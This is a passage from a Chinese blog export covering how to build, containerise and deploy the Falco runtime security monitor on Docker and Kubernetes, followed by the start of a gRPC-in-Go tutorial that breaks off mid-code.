<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">docker cp falcobuild:<span class="regexp">/root/</span>falco<span class="regexp">/build/</span>driver <span class="regexp">/falco/</span>alpine<span class="regexp">/falco/</span>build/</span><br><span class="line">docker cp falcobuild:<span class="regexp">/root/</span>falco<span class="regexp">/build/u</span>serspace <span class="regexp">/falco/</span>alpine<span class="regexp">/falco/</span>build/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#rmmod falco</span></span><br><span class="line">insmod driver/falco.ko</span><br><span class="line">.<span class="regexp">/userspace/</span>falco<span class="regexp">/falco -c ../</span>falco.yaml -r ..<span class="regexp">/rules/</span>falco_rules.yaml</span><br></pre></td></tr></table></figure>



<p>参考：</p>
<ul>
<li><p><a href="https://falco.org/docs/getting-started/source/">https://falco.org/docs/getting-started/source/</a></p>
</li>
<li><p><a href="https://github.com/falcosecurity/libs">https://github.com/falcosecurity/libs</a></p>
</li>
</ul>
<h2 id="2-docker构建"><a href="#2-docker构建" class="headerlink" title="2. docker构建"></a>2. docker构建</h2><h3 id="2-1-使用Debian"><a href="#2-1-使用Debian" class="headerlink" title="2.1 使用Debian"></a>2.1 使用Debian</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">docker run --name myfalco -itd --privileged -v <span class="regexp">/boot:/</span>boot:ro -v <span class="regexp">/var/</span>run<span class="regexp">/docker.sock:/</span>var<span class="regexp">/run/</span>docker.sock -v <span class="regexp">/lib/m</span>odules:<span class="regexp">/lib/m</span>odules debian:buster</span><br></pre></td></tr></table></figure>



<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">docker exec -it falco <span class="regexp">/bin/</span>bash</span><br><span class="line">mkdir -p <span class="regexp">/agent/</span>falco/driver</span><br><span class="line">mkdir -p <span class="regexp">/agent/</span>falco/rules</span><br><span class="line"></span><br><span class="line"><span class="comment">#将编译好的复制到容器</span></span><br><span class="line">docker cp <span class="regexp">/root/</span>falco<span class="regexp">/build/u</span>serspace<span class="regexp">/falco/</span>falco falco:<span class="regexp">/agent/</span>falco</span><br><span class="line">docker cp <span class="regexp">/root/</span>falco<span class="regexp">/build/</span>driver<span class="regexp">/falco.ko falco:/</span>agent<span class="regexp">/falco/</span>driver</span><br><span class="line">docker cp <span class="regexp">/root/</span>falco<span class="regexp">/falco.yaml falco:/</span>agent/falco</span><br><span class="line">docker cp <span class="regexp">/root/</span>falco<span class="regexp">/rules/</span>falco_rules.yaml falco:<span class="regexp">/agent/</span>falco/rules</span><br><span class="line">docker cp <span class="regexp">/root/</span>falco<span class="regexp">/rules/</span>falco_rules.local.yaml falco:<span class="regexp">/agent/</span>falco/rules</span><br><span class="line"></span><br><span class="line"><span class="comment">##安装一些必要的软件</span></span><br><span class="line">sed -i <span class="string">&#x27;s/deb.debian.org/mirrors.ustc.edu.cn/g&#x27;</span> <span class="regexp">/etc/</span>apt/sources.list</span><br><span class="line">sed -i <span class="string">&#x27;s|security.debian.org/debian-security|mirrors.ustc.edu.cn/debian-security|g&#x27;</span> <span class="regexp">/etc/</span>apt/sources.list</span><br><span class="line">apt update</span><br><span class="line">apt --fix-broken install</span><br><span class="line">apt install vim</span><br><span class="line">apt install busybox</span><br><span class="line">apt install kmod</span><br><span class="line"></span><br><span class="line"><span class="comment">#将webserver设为false</span></span><br><span class="line">vim <span class="regexp">/agent/</span>falco/falco.yaml</span><br><span class="line"></span><br><span class="line"><span class="comment">#加载内核模块</span></span><br><span class="line">insmod <span class="regexp">/agent/</span>falco<span class="regexp">/driver/</span>falco.ko</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行</span></span><br><span class="line"><span class="regexp">/agent/</span>falco<span class="regexp">/falco -c /</span>agent<span class="regexp">/falco/</span>falco.yaml -r <span class="regexp">/agent/</span>falco<span class="regexp">/rules/</span></span><br></pre></td></tr></table></figure>

<p>保存镜像</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker</span> commit falco myfalco:v<span class="number">0</span>.<span class="number">21</span></span><br></pre></td></tr></table></figure>

<p>运行</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">docker run --rm --name myfalco --privileged --rm -it -v <span class="regexp">/boot:/</span>boot:ro -v <span class="regexp">/var/</span>run<span class="regexp">/docker.sock:/</span>var<span class="regexp">/run/</span>docker.sock -v <span class="regexp">/lib/m</span>odules:<span class="regexp">/lib/m</span>odules myfalco:v0.<span class="number">21</span></span><br><span class="line"></span><br><span class="line"><span class="regexp">/agent/</span>falco<span class="regexp">/falco -c /</span>agent<span class="regexp">/falco/</span>falco.yaml -r <span class="regexp">/agent/</span>falco/rules</span><br></pre></td></tr></table></figure>



<h3 id="2-2-使用Alpine"><a href="#2-2-使用Alpine" class="headerlink" title="2.2 使用Alpine"></a>2.2 使用Alpine</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run --name myfalco -itd --privileged -v /boot:/boot:ro -v /var/run/docker.sock:/var/run/docker.sock -v /lib/modules:/lib/modules alpine:latest</span><br><span class="line"></span><br><span class="line">docker exec -it myfalco sh</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">替换镜像源加速</span></span><br><span class="line">sed -i &quot;s/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g&quot; /etc/apk/repositories</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">安装必要工具</span></span><br><span class="line">apk update</span><br><span class="line">apk add --no-cache busybox</span><br><span class="line">apk add --no-cache kmod</span><br><span class="line">apk add --no-cache logger</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">创建falco目录</span></span><br><span class="line">mkdir -p /agent/falco/driver</span><br><span class="line">mkdir -p /agent/falco/rules</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">将宿主机falco文件移动到容器</span></span><br><span class="line">docker cp /falco/alpine/falco/build/userspace/falco/falco myfalco:/agent/falco</span><br><span class="line">docker cp /falco/alpine/falco/build/driver/falco.ko myfalco:/agent/falco/driver</span><br><span class="line">docker cp /falco/alpine/falco/falco.yaml myfalco:/agent/falco</span><br><span class="line">docker cp /falco/alpine/falco/rules/falco_rules.yaml myfalco:/agent/falco/rules</span><br><span class="line">docker cp /falco/alpine/falco/rules/falco_rules.local.yaml myfalco:/agent/falco/rules</span><br><span class="line"></span><br><span class="line">insmod /agent/falco/driver/falco.ko</span><br><span class="line"></span><br><span class="line">/agent/falco/falco -c /agent/falco/falco.yaml -r /agent/falco/rules/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">测试抓取capabilites权限</span></span><br><span class="line">docker run --name test --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined --rm alpine sh</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">commit</span></span><br><span class="line">docker commit myfalco myfalco:v0.31</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">通过alpine打包的只有29.6M,通过debian打包却要300多M</span></span><br><span class="line">[root@node1 build]# docker images | grep myfalco</span><br><span class="line">myfalco                       v0.31     07a980694db7   39 seconds ago   29.6MB</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h3 id="2-4-使用no-driver镜像"><a href="#2-4-使用no-driver镜像" class="headerlink" title="2.4 使用no-driver镜像"></a>2.4 使用no-driver镜像</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">docker run --name myfalco --rm -itd \</span><br><span class="line">    --privileged \</span><br><span class="line">    -v <span class="regexp">/var/</span>run<span class="regexp">/docker.sock:/</span>host<span class="regexp">/var/</span>run/docker.sock \</span><br><span class="line">    -v <span class="regexp">/dev:/</span>host/dev \</span><br><span class="line">    -v <span class="regexp">/lib/m</span>odules:<span class="regexp">/lib/m</span>odules \</span><br><span class="line">    -v <span class="regexp">/proc:/</span>host/proc:ro \</span><br><span class="line">    falcosecurity/falco-no-driver:latest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mkdir -p <span class="regexp">/agent/</span>falco/driver</span><br><span class="line">mkdir -p <span class="regexp">/agent/</span>falco/rules</span><br><span class="line"></span><br><span class="line"><span class="comment">#将编译好的复制到容器</span></span><br><span class="line">docker cp <span class="regexp">/root/</span>falco<span class="regexp">/build/u</span>serspace<span class="regexp">/falco/</span>falco myfalco:<span class="regexp">/agent/</span>falco</span><br><span class="line">docker cp <span class="regexp">/root/</span>falco<span class="regexp">/build/</span>driver<span class="regexp">/falco.ko myfalco:/</span>agent<span class="regexp">/falco/</span>driver</span><br><span class="line">docker cp <span class="regexp">/root/</span>falco<span class="regexp">/falco.yaml myfalco:/</span>agent/falco</span><br><span class="line">docker cp <span class="regexp">/root/</span>falco<span class="regexp">/rules/</span>falco_rules.yaml myfalco:<span class="regexp">/agent/</span>falco/rules</span><br><span class="line">docker cp <span class="regexp">/root/</span>falco<span class="regexp">/rules/</span>falco_rules.local.yaml myfalco:<span class="regexp">/agent/</span>falco/rules</span><br><span class="line"></span><br><span class="line"><span class="comment">##安装一些必要的软件</span></span><br><span class="line">apt update</span><br><span class="line">apt --fix-broken install</span><br><span class="line">apt install busybox</span><br><span class="line">apt install vim</span><br><span class="line">apt install kmod</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">docker run --name myfalcox --rm -itd \</span><br><span class="line">    --privileged \</span><br><span class="line">    -v <span class="regexp">/var/</span>run<span class="regexp">/docker.sock:/</span>host<span class="regexp">/var/</span>run/docker.sock \</span><br><span class="line">    -v <span class="regexp">/dev:/</span>host/dev \</span><br><span class="line">    -v <span class="regexp">/lib/m</span>odules:<span class="regexp">/host/</span>lib/modules \</span><br><span class="line">    -v <span class="regexp">/proc:/</span>host/proc:ro \</span><br><span class="line">    myfalco:v2.<span class="number">3.01</span></span><br></pre></td></tr></table></figure>



<h3 id="2-8-完整的falco镜像"><a href="#2-8-完整的falco镜像" class="headerlink" title="2.8 完整的falco镜像"></a>2.8 完整的falco镜像</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">docker run --rm --name myfalco -itd \</span><br><span class="line">    --privileged \</span><br><span class="line">    -v <span class="regexp">/var/</span>run<span class="regexp">/docker.sock:/</span>host<span class="regexp">/var/</span>run/docker.sock \</span><br><span class="line">    -v <span class="regexp">/dev:/</span>host/dev \</span><br><span class="line">    -v <span class="regexp">/proc:/</span>host/proc:ro \</span><br><span class="line">    -v <span class="regexp">/boot:/</span>host/boot:ro \</span><br><span class="line">    -v <span class="regexp">/lib/m</span>odules:<span class="regexp">/host/</span>lib/modules:ro \</span><br><span class="line">    -v <span class="regexp">/usr:/</span>host/usr:ro \</span><br><span class="line">    -v <span class="regexp">/etc:/</span>host/etc:ro \</span><br><span class="line">    falcosecurity/falco:latest</span><br><span class="line">    </span><br><span class="line">mkdir -p <span class="regexp">/agent/</span>falco/driver</span><br><span class="line">mkdir -p <span class="regexp">/agent/</span>falco/rules</span><br><span class="line"></span><br><span class="line"><span class="comment">#将编译好的复制到容器</span></span><br><span class="line">docker cp <span class="regexp">/root/</span>falco<span class="regexp">/build/u</span>serspace<span class="regexp">/falco/</span>falco myfalco:<span class="regexp">/agent/</span>falco</span><br><span class="line">docker cp <span class="regexp">/root/</span>falco<span class="regexp">/build/</span>driver<span class="regexp">/falco.ko myfalco:/</span>agent<span class="regexp">/falco/</span>driver</span><br><span class="line">docker cp <span class="regexp">/root/</span>falco<span class="regexp">/falco.yaml myfalco:/</span>agent/falco</span><br><span class="line">docker cp <span class="regexp">/root/</span>falco<span class="regexp">/rules/</span>falco_rules.yaml myfalco:<span class="regexp">/agent/</span>falco/rules</span><br><span class="line">docker cp <span class="regexp">/root/</span>falco<span class="regexp">/rules/</span>falco_rules.local.yaml myfalco:<span class="regexp">/agent/</span>falco/rules</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##安装一些必要的软件</span></span><br><span class="line">sed -i <span class="string">&#x27;s/deb.debian.org/mirrors.ustc.edu.cn/g&#x27;</span> <span class="regexp">/etc/</span>apt/sources.list</span><br><span class="line">sed -i <span class="string">&#x27;s|security.debian.org/debian-security|mirrors.ustc.edu.cn/debian-security|g&#x27;</span> <span class="regexp">/etc/</span>apt/sources.list</span><br><span class="line">apt update</span><br><span class="line">apt --fix-broken install</span><br><span class="line">apt install vim</span><br><span class="line">apt install busybox</span><br><span class="line">apt install kmod</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker</span><br></pre></td></tr></table></figure>









<h3 id="2-7-Dockerfile打包"><a href="#2-7-Dockerfile打包" class="headerlink" title="2.7 Dockerfile打包"></a>2.7 Dockerfile打包</h3><ul>
<li><p>vi Dockerfile</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> myfalco:v0.<span class="number">31</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./docker-entrypoint.sh /</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">&quot;/docker-entrypoint.sh&quot;</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;/agent/falco/falco&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;/agent/falco/falco.yaml&quot;</span>, <span class="string">&quot;-r&quot;</span>, <span class="string">&quot;/agent/falco/rules&quot;</span> ]</span></span><br></pre></td></tr></table></figure></li>
<li><p>vi docker-entrypoint.sh</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/env sh</span></span><br><span class="line">a=`lsmod | cut -d&#x27; &#x27; -f1 | grep falco`</span><br><span class="line">b=&quot;falco&quot;</span><br><span class="line"></span><br><span class="line">if [ &quot;$a&quot; == &quot;$b&quot; ]</span><br><span class="line">then</span><br><span class="line">  rmmod falco</span><br><span class="line">  insmod /agent/falco/driver/falco.ko</span><br><span class="line">  echo &quot;falco.ko exists, falco.ko has reloaded!&quot;</span><br><span class="line">else</span><br><span class="line">  insmod /agent/falco/driver/falco.ko</span><br><span class="line">  echo &quot;falco.ko not exits, falco.ko has loaded!&quot;</span><br><span class="line">fi</span><br><span class="line">exec &quot;$@&quot;</span><br></pre></td></tr></table></figure>

<p>chmod +x docker-entrypoint.sh</p>
</li>
</ul>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker</span> build -t myfalco:v<span class="number">1</span>.<span class="number">31</span> .</span><br></pre></td></tr></table></figure>

<p>测试运行</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">docker run --rm --name myfalcox -it --privileged -v <span class="regexp">/boot:/</span>boot:ro -v <span class="regexp">/var/</span>run<span class="regexp">/docker.sock:/</span>var<span class="regexp">/run/</span>docker.sock:ro -v <span class="regexp">/lib/m</span>odules:<span class="regexp">/lib/m</span>odules:ro myfalco:v1.<span class="number">31</span></span><br></pre></td></tr></table></figure>



<p>参考：</p>
<ul>
<li><a href="https://falco.org/docs/getting-started/running/">https://falco.org/docs/getting-started/running/</a></li>
</ul>
<h2 id="3-k8s部署"><a href="#3-k8s部署" class="headerlink" title="3. k8s部署"></a>3. k8s部署</h2><p>部署到node1节点</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">falco</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">falco</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">falco</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">falco</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">nodeSelector:</span></span><br><span class="line">        <span class="attr">kubernetes.io/hostname:</span> <span class="string">node1</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">falco</span></span><br><span class="line">          <span class="attr">image:</span> <span class="string">myfalco:v1.31</span></span><br><span class="line">          <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">          <span class="attr">securityContext:</span></span><br><span class="line">            <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line"><span class="comment"># Uncomment the 3 lines below to enable eBPF support for Falco.</span></span><br><span class="line"><span class="comment"># This allows Falco to run on Google COS.</span></span><br><span class="line"><span class="comment"># Leave blank for the default probe location, or set to the path</span></span><br><span class="line"><span class="comment"># of a precompiled probe.</span></span><br><span class="line"><span class="comment">#          env:</span></span><br><span class="line"><span class="comment">#          - name: SYSDIG_BPF_PROBE</span></span><br><span class="line"><span class="comment">#            value: &quot;&quot;</span></span><br><span class="line">          <span class="attr">args:</span> [ <span class="string">&quot;/agent/falco/falco&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;/agent/falco/falco.yaml&quot;</span>, <span class="string">&quot;-r&quot;</span>, <span class="string">&quot;/agent/falco/rules&quot;</span>, <span class="string">&quot;--cri&quot;</span>, <span class="string">&quot;/run/containerd/containerd.sock&quot;</span>, <span class="string">&quot;-K&quot;</span>, <span class="string">&quot;/var/run/secrets/kubernetes.io/serviceaccount/token&quot;</span>]</span><br><span class="line">          <span class="attr">volumeMounts:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/var/run/docker.sock</span></span><br><span class="line">              <span class="attr">name:</span> <span class="string">docker-socket</span></span><br><span class="line">              <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/run/containerd/containerd.sock</span></span><br><span class="line">              <span class="attr">name:</span> <span class="string">containerd-socket</span></span><br><span class="line">              <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/boot</span></span><br><span class="line">              <span class="attr">name:</span> <span class="string">boot-fs</span></span><br><span class="line">              <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/lib/modules</span></span><br><span class="line">              <span class="attr">name:</span> <span class="string">lib-modules</span></span><br><span class="line">              <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">docker-socket</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/var/run/docker.sock</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">containerd-socket</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/run/containerd/containerd.sock</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">boot-fs</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/boot</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">lib-modules</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/lib/modules</span></span><br></pre></td></tr></table></figure>









]]></content>
      <categories>
        <category>云原生安全</category>
      </categories>
      <tags>
        <tag>云原生安全</tag>
      </tags>
  </entry>
  <entry>
    <title>gRPC入门案例</title>
    <url>/gRPC%E5%85%A5%E9%97%A8%E6%A1%88%E4%BE%8B/</url>
    <content><![CDATA[<p>gRPC入门案例</p>
<span id="more"></span>

<h2 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1. 环境准备"></a>1. 环境准备</h2><h3 id="1-1-golang配置"><a href="#1-1-golang配置" class="headerlink" title="1.1 golang配置"></a>1.1 golang配置</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Golang</span></span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">GOROOT</span>=/usr/local/go</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">GOPATH</span>=<span class="variable">$HOME</span>/go</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=<span class="variable">$PATH</span>:$GOROOT/bin:$GOPATH/bin</span><br></pre></td></tr></table></figure>



<h3 id="1-2-安装gRPC"><a href="#1-2-安装gRPC" class="headerlink" title="1.2 安装gRPC"></a>1.2 安装gRPC</h3><figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line"><span class="built_in">go</span> <span class="built_in">get</span> -u google.golang.org/grpc</span><br></pre></td></tr></table></figure>





<h3 id="1-3-Protocol-buffer安装"><a href="#1-3-Protocol-buffer安装" class="headerlink" title="1.3 Protocol buffer安装"></a>1.3 Protocol buffer安装</h3><p>官网：<a href="https://developers.google.com/protocol-buffers">https://developers.google.com/protocol-buffers</a></p>
<p>The protocol compiler is written in C++. If you are using C++, please follow the <a href="https://github.com/protocolbuffers/protobuf/blob/main/src/README.md">C++ Installation Instructions</a> to install protoc along with the C++ runtime.</p>
<p>For non-C++ users, the simplest way to install the protocol compiler is to download a pre-built binary from our release page <a href="https://github.com/protocolbuffers/protobuf/releases">https://github.com/protocolbuffers/protobuf/releases</a></p>
<p>下载</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attribute">wget</span> https://github.com/protocolbuffers/protobuf/releases/download/v<span class="number">21</span>.<span class="number">1</span>/protoc-<span class="number">21</span>.<span class="number">1</span>-linux-x<span class="number">86</span>_<span class="number">64</span>.zip</span><br><span class="line"></span><br><span class="line"><span class="attribute">unzip</span> -d protoc-<span class="number">21</span>.<span class="number">1</span> protoc-<span class="number">21</span>.<span class="number">1</span>-linux-x<span class="number">86</span>_<span class="number">64</span>.zip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">mv</span> protoc-<span class="number">21</span>.<span class="number">1</span> /usr/local</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>添加环境变量</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#PROTOBUF</span></span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PROTOBUF_HOME</span>=/usr/local/protoc-21.1</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=<span class="variable">$PROTOBUF_HOME</span>/bin:$PATH</span><br></pre></td></tr></table></figure>

<p>确认 protoc 安装完成。</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@debian</span> pkg]<span class="meta"># protoc --version</span></span><br><span class="line">libprotoc <span class="number">3.21</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>



<h3 id="1-4-gRPC-in-Go"><a href="#1-4-gRPC-in-Go" class="headerlink" title="1.4 gRPC in Go"></a>1.4 gRPC in Go</h3><p><a href="https://grpc.io/docs/languages/go/quickstart/">https://grpc.io/docs/languages/go/quickstart/</a></p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">go install google.golang.org<span class="regexp">/protobuf/</span>cmd/protoc-gen-go@v1.<span class="number">28</span></span><br><span class="line">go install google.golang.org<span class="regexp">/grpc/</span>cmd/protoc-gen-go-grpc@v1.<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>

<p>确认 protoc-gen-go 安装完成。</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">[root@debian pkg]# protoc-<span class="keyword">gen</span>-go --<span class="keyword">version</span></span><br><span class="line">protoc-<span class="keyword">gen</span>-go v1.28.0</span><br></pre></td></tr></table></figure>

<p>确认 protoc-gen-go-grpc 安装完成。</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">[root@debian pkg]# protoc-<span class="keyword">gen</span>-go-grpc --<span class="keyword">version</span></span><br><span class="line">protoc-<span class="keyword">gen</span>-go-grpc 1.2.0</span><br></pre></td></tr></table></figure>



<h2 id="2-Demo测试"><a href="#2-Demo测试" class="headerlink" title="2. Demo测试"></a>2. Demo测试</h2><h3 id="2-1-编写proto代码"><a href="#2-1-编写proto代码" class="headerlink" title="2.1 编写proto代码"></a>2.1 编写proto代码</h3><ol>
<li><p>新建项目grpc-demo，根目录执行<code>go mod init grpc-demo</code></p>
</li>
<li><p>新建grpc-demo/helloword文件夹，编写helloword.proto</p>
<ul>
<li>helloword.proto</li>
</ul>
<figure class="highlight protobuf"><table><tr><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>; <span class="comment">// 版本声明，使用Protocol Buffers v3版本</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">option</span> go_package = <span class="string">&quot;gprc-demo/helloworld/helloworld&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> helloworld; <span class="comment">// 包名</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// The greeting service definition.</span></span><br><span class="line"><span class="class"><span class="keyword">service</span> <span class="title">Greeter</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Sends a greeting</span></span><br><span class="line">    <span class="function"><span class="keyword">rpc</span> SayHello (HelloRequest) <span class="keyword">returns</span> (HelloReply) </span>&#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// The request message containing the user&#x27;s name.</span></span><br><span class="line">  <span class="class"><span class="keyword">message</span> <span class="title">HelloRequest</span> </span>&#123;</span><br><span class="line">    <span class="built_in">string</span> name = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// The response message containing the greetings</span></span><br><span class="line">  <span class="class"><span class="keyword">message</span> <span class="title">HelloReply</span> </span>&#123;</span><br><span class="line">    <span class="built_in">string</span> <span class="class"><span class="keyword">message</span> = 1;</span></span><br><span class="line"><span class="class">  &#125;</span></span><br></pre></td></tr></table></figure>

<p>在项目根目录下执行</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">protoc <span class="attribute">--go_out</span>=. <span class="attribute">--go_opt</span>=paths=source_relative \</span><br><span class="line">    <span class="attribute">--go-grpc_out</span>=. <span class="attribute">--go-grpc_opt</span>=paths=source_relative \</span><br><span class="line">    helloworld/helloworld.proto</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="2-2-编写Server代码"><a href="#2-2-编写Server代码" class="headerlink" title="2.2 编写Server代码"></a>2.2 编写Server代码</h3><p>新建grpc-demo/greeter_server目录</p>
<ul>
<li><p>main.go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;flag&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;google.golang.org/grpc&quot;</span></span><br><span class="line">	pb <span class="string">&quot;grpc-demo/helloworld&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	port = flag.Int(<span class="string">&quot;port&quot;</span>, <span class="number">50051</span>, <span class="string">&quot;The server port&quot;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// server is used to implement helloworld.GreeterServer.</span></span><br><span class="line"><span class="keyword">type</span> server <span class="keyword">struct</span> &#123;</span><br><span class="line">	pb.UnimplementedGreeterServer</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SayHello implements helloworld.GreeterServer</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *server)</span> <span class="title">SayHello</span><span class="params">(ctx context.Context, in *pb.HelloRequest)</span> <span class="params">(*pb.HelloReply, error)</span></span> &#123;</span><br><span class="line">	log.Printf(<span class="string">&quot;Received: %v&quot;</span>, in.GetName())</span><br><span class="line">	<span class="keyword">return</span> &amp;pb.HelloReply&#123;Message: <span class="string">&quot;Hello &quot;</span> + in.GetName()&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	flag.Parse()</span><br><span class="line">	lis, err := net.Listen(<span class="string">&quot;tcp&quot;</span>, fmt.Sprintf(<span class="string">&quot;:%d&quot;</span>, *port))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">&quot;failed to listen: %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	s := grpc.NewServer()</span><br><span class="line">	pb.RegisterGreeterServer(s, &amp;server&#123;&#125;)</span><br><span class="line">	log.Printf(<span class="string">&quot;server listening at %v&quot;</span>, lis.Addr())</span><br><span class="line">	